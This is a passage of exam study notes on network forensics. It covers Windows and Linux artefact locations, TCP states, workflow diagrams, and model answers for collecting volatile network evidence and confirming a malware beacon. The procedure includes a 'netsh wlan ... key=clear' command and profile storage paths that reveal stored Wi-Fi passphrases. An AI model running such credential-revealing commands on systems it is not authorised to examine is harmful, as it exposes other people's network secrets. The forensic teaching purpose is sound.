`/var/lib/dhclient/*.leases` | Registry explorer | `cat` lease files | | Wi-Fi Profiles | `netsh wlan show profiles` | `/etc/NetworkManager/system-connections/` | `netsh wlan` | `nmcli`, `cat` | | Firewall Logs | `C:\Windows\System32\LogFiles\Firewall\pfirewall.log` | `/var/log/ufw.log`, `/var/log/kern.log` | Event Viewer, FW MMC | `journalctl`, `dmesg` | | VPN State | RAS phonebook, registry | `/var/log/openvpn.log`, `wg show` | `rasdial`, `rasphone` | `wg`, `openvpn` | | Browser Network | SQLite DB, Prefetch | `~/.config/google-chrome/Default/Network` | DB Browser for SQLite | `sqlite3` | ## 3.4 Mathematical Model — TCP Connection State Machine (Forensic Relevance) The TCP FSM has 11 states. KTU may ask: *"Given a netstat output, determine the forensic significance of each state."* $$ \begin{aligned} \text{State Space} = \{ & \text{CLOSED}, \text{LISTEN}, \text{SYN\_SENT}, \text{SYN\_RECEIVED}, \\ & \text{ESTABLISHED}, \text{FIN\_WAIT\_1}, \text{FIN\_WAIT\_2}, \text{CLOSE\_WAIT}, \\ & \text{CLOSING}, \text{LAST\_ACK}, \text{TIME\_WAIT} \} \end{aligned} $$ | State | Forensic Implication | |---|---| | `LISTEN` | A service is bound and accepting — possible backdoor if unexpected | | `SYN_SENT` | Active connection initiation — half-open scan indicator | | `ESTABLISHED` | Live connection — current network activity | | `TIME_WAIT` | Recently closed — often ignored but reveals prior sessions | | `CLOSE_WAIT` | Remote closed, local hasn't — possible zombie / unresponsive service | | `FIN_WAIT_1/2` | Graceful shutdown in progress | > [!IMPORTANT] > **KTU Tip:** Examiners may give a `netstat` output snippet and ask the student to identify which state corresponds to a **port scan** (SYN_SENT or SYN_RECEIVED) or a **backdoor** (LISTEN on a high port). --- # 4. Structural Diagrams & Schematics ## 4.1 Forensic Network Information Collection Workflow ```mermaid flowchart TD A[START: Identify Suspect Machine] --> B[Document Physical & Logical State] B --> C[Acquire Volatile Network State] C --> C1[Capture ARP Cache arp -a / ip neigh] C --> C2[Capture Routing Table route print / ip route] C --> C3[Capture Active Sockets netstat -anob / ss -tulnp] C --> C4[Capture DNS Cache ipconfig displaydns / systemd-resolve] C --> C5[Capture DHCP Lease Info] C --> D[Acquire Semi-Volatile Logs] D --> D1[Firewall Logs pfirewall.log / iptables] D --> D2[System Event Logs Event Viewer / journalctl] D --> D3[Wireless Profiles netsh wlan / NetworkManager] D --> E[Acquire Non-Volatile Disk Artefacts] E --> E1[Registry Network Keys Windows] E --> E2[etc network interfaces / etc resolv.conf Linux] E --> E3[Browser Network DBs History, Cookies] E --> F[Generate Forensic Timeline] F --> G[Cross-Correlate Layers 2 to 7] G --> H[Produce Forensic Report with Chain of Custody] H --> I[END] ``` ## 4.2 TCP/IP Forensic Layer-Cross-Correlation Diagram ```mermaid flowchart LR L7[Layer 7 Application
DNS Cache HTTP Sessions] --> L6[Layer 6 Presentation
TLS Cipher Suites Certificates] L6 --> L5[Layer 5 Session
NetBIOS SMB Sessions] L5 --> L4[Layer 4 Transport
Active Sockets netstat ss] L4 --> L3[Layer 3 Network
IP Config Route Table] L3 --> L2[Layer 2 Data Link
ARP Cache MAC Table] L2 --> L1[Layer 1 Physical
Wireless SSID Ethernet Tap] EV1[Forensic Tool: ipconfig ifconfig] -.-> L3 EV2[Forensic Tool: arp ip neigh] -.-> L2 EV3[Forensic Tool: netstat ss] -.-> L4 EV4[Forensic Tool: ipconfig displaydns systemd-resolve] -.-> L7 EV5[Forensic Tool: netsh wlan iwconfig] -.-> L1 ``` ## 4.3 Windows vs. Linux Network Forensics — Functional Architecture ```mermaid flowchart TB subgraph WINDOWS_SIDE[Windows Network Forensics Stack] W1[ipconfig /all] --> WSTORE[Registry Hive
SYSTEM SAM SOFTWARE] W2[arp -a] --> WSTORE W3[netstat -anob] --> WSTORE W4[netsh wlan show profiles] --> WSTORE W5[Get-EventLog Security System] --> WSTORE end subgraph LINUX_SIDE[Linux Network Forensics Stack] L1[ip addr / ifconfig] --> LSTORE[Proc FS
var log etc] L2[ip neigh / arp] --> LSTORE L3[ss -tulnp / netstat] --> LSTORE L4[iwconfig / nmcli] --> LSTORE L5[journalctl / var log messages] --> LSTORE end WSTORE --> ANALYSE[Cross-Correlate Timestamps
and Artefacts] LSTORE --> ANALYSE ANALYSE --> REPORT[Forensic Report
with Court-Admissible Evidence] ``` ## 4.4 Order of Volatility Decision Tree (RFC 3227 Adapted) ```mermaid flowchart TD Q1{Network State
in RAM?} -->|Yes| A1[High Priority Capture] Q1 -->|No| Q2{State in
System Logs?} Q2 -->|Yes| A2[Medium Priority Capture] Q2 -->|No| Q3{State on
Disk Files?} Q3 -->|Yes| A3[Low Priority Capture] Q3 -->|No| A4[Not Preserved
Check Backups] A1 --> A1A[ARP, Routing, Sockets, DNS Cache] A2 --> A2A[DHCP, Firewall, Event Logs] A3 --> A3A[Registry, Config Files, Wi-Fi Profiles] ``` --- # 5. KTU 2024 Scheme Examination Question Bank & Topic Recap ## 5.1 Part A — Short Answer Questions (3 Marks Each) ### Q1. `[KTU University Exam - May 2024]` **Define ARP cache and explain its forensic significance.** **Model Answer (3 marks):** - **Definition (1 mark):** The ARP (Address Resolution Protocol) cache is a table maintained by the operating system that maps Layer-3 IP addresses to Layer-2 MAC addresses of devices on the local network segment. - **Forensic Significance (1 mark):** It reveals the *other hosts* the suspect machine has communicated with on the LAN in the recent past, including potential co-conspirators, lateral movement targets, and C2 servers on the same subnet. - **Volatility (1 mark):** It is *volatile* — residing in RAM — and must be captured using `arp -a` (Windows) or `ip neigh show` (Linux) before system shutdown, per RFC 3227 order of volatility. ### Q2. `[KTU University Exam - Dec 2023]` **List any three differences between `netstat` and `ss` commands in Linux from a forensic perspective.** **Model Answer (3 marks):** 1. **Data Source (1 mark):** `netstat` reads from `/proc/net/tcp` and related proc files (slower, legacy); `ss` reads directly from kernel netlink sockets (faster, more accurate for current state). 2. **Performance (1 mark):** On a system with thousands of sockets, `ss` outperforms `netstat` by an order of magnitude — important when triaging large servers. 3. **Feature Set (1 mark):** `ss` supports advanced filters (`ss -t state established 'sport = :443'`) and socket memory statistics not available in `netstat`, enabling more granular forensic filtering. --- ## 5.2 Part B — Long Answer Questions (14 Marks Each) — Internal Choice ### Question A `[KTU University Exam - Dec 2024]` **(a)** Explain in detail the various network information artefacts that can be extracted from a **Windows** system during a forensic investigation. Describe the tools, commands, and storage locations for each artefact. **(7 marks)** **(b)** A forensic investigator captures a Windows machine suspected of malware beaconing. The `netstat -anob` output shows multiple connections to `185.220.101.42:443` in `ESTABLISHED` state. Describe the **systematic forensic procedure** the investigator should follow to confirm and document this malicious activity. **(7 marks)** --- #### Model Solution for Question A (a) — Windows Network Artefacts (7 marks) | Artefact | Command / Tool | Storage Location | Forensic Value | |---|---|---|---| | **IP Configuration** | `ipconfig /all` | `HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{GUID}` | Identity of network, DNS servers, DHCP state | | **ARP Cache** | `arp -a` | `HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\ArpCache` (registry cached) | Recently contacted LAN hosts | | **Routing Table** | `route print`, `netsh interface ip show route` | `netbt.sys` driver state | Rogue or unauthorised routes | | **DNS Cache** | `ipconfig /displaydns` | `dnsrslvr.log`, `svc` host memory | Domains the machine has resolved — C2 indicator | | **Active Sockets** | `netstat -anob` (or `Get-NetTCPConnection` PowerShell) | `tcpip.sys` kernel structures, RAM | Live backdoors, reverse shells | | **Wi-Fi Profiles** | `netsh wlan show profiles` + `key=clear` | `C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\{GUID}\{SSID}.xml` | Location history, recovered PSKs | | **Firewall Logs** | `pfirewall.log` | `C:\Windows\System32\LogFiles\Firewall\` | Allowed/blocked connections with timestamps | | **DHCP Leases** | Event Viewer, `ipconfig /all` | `C:\Windows\System32\dhcp\` event logs | Historical network membership | | **Browser Network** | Chrome/Edge SQLite | `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network` | HSTS, certificate pinning, cookies | **Step-by-step Procedure (each 1 mark for the procedure + 1 mark for the tool):** 1. **Acquire volatile state first** — Run `netstat -anob > netstat.txt` and `arp -a > arp.txt` *before* any other action. 2. **Capture IP configuration** — `ipconfig /all > ipconfig.txt`. 3. **Extract DNS cache** — `ipconfig /displaydns > dnscache.txt`. 4. **Enumerate Wi-Fi profiles** — `netsh wlan show profiles` and `netsh wlan show profile name="X" key=clear`. 5. **Examine firewall logs** — Copy `pfirewall.log` to forensic drive with hash (SHA-256). 6. **Inspect registry** — Export `HKLM\SYSTEM\CurrentControlSet\Services\Tcpip` for persistent network config. 7. **Document with timestamps and hashes** — Generate a chain-of-custody log. --- #### Model Solution for Question A (b) — Confirming the Beacon (7 marks) **Step 1 — IP Reputation Lookup (1 mark)** Run `185.220.101.42` against threat-intelligence databases (VirusTotal, AbuseIPDB, Tor exit node lists). *Note: 185.220.101.0/24 is historically a known Tor exit range.* **Step 2 — DNS Resolution Trace (1 mark)** Even though `netstat` shows the IP, retrieve the **hostname** that resolved to it by: - `ipconfig /displaydns` (look for the matching A-record). - DNS server logs (if subpoena-able). - Passive DNS aggregators (e.g., VirusTotal, ThreatCrowd). **Step 3 — Process Attribution (1 mark)** From `netstat -anob`, identify the **PID** owning the socket.
